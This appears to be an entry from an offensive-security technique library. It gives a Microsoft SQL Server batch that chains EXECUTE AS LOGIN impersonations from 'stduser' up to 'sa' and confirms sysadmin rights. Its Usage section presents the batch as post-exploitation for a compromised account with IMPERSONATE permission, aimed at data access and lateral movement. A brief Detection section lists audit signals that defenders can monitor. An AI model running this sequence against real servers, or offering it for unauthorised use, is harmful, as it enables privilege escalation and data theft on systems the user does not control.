---
id: c83b386b-3e86-43c8-9c72-bf2d9c6f0eb8
name: SQL-Nested-Impersonation-Sequence
type: code
language: sql
verified: true
created_at: '2023-04-06T03:56:21.083249+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - SQL Server
tags:
  - mssql
  - impersonation
  - privilege-escalation
validated: true
---

# SQL-Nested-Impersonation-Sequence

## Code

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
EXECUTE AS LOGIN = 'stduser'
SELECT SYSTEM_USER
EXECUTE AS LOGIN = 'sa'
SELECT IS_SRVROLEMEMBER('sysadmin')
SELECT ORIGINAL_LOGIN()
SELECT SYSTEM_USER
```

## Description

This SQL code snippet executes a full nested impersonation sequence in Microsoft SQL Server: it checks the initial user and sysadmin status, impersonates a standard user ('stduser'), then escalates to 'sa', verifies sysadmin privileges, and finally checks the original login. It demonstrates privilege escalation without altering the underlying database.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'stduser' | Low-privilege login to impersonate first | stduser |
| 'sa' | High-privilege sysadmin login to escalate to | sa |

## Usage

Execute this as a batch in SQL Server Management Studio (SSMS) or via sqlcmd after gaining initial access with a compromised account that has IMPERSONATE permissions. Use it in post-exploitation to chain contexts for data access or lateral movement. Follow with REVERT statements to exit impersonations cleanly.

## Detection

- Monitor SQL Server error logs and audit traces for EXECUTE AS events, unusual role checks (IS_SRVROLEMEMBER), or context switches.
- Enable Extended Events for impersonation sessions.
- Look for anomalous queries from low-priv accounts accessing sysadmin functions.
- Network indicators: Unusual SQL traffic patterns from compromised hosts.

## Related

- [[procedures/Nested-Impersonation-Privilege-Escalation-in-SQL-Server]]
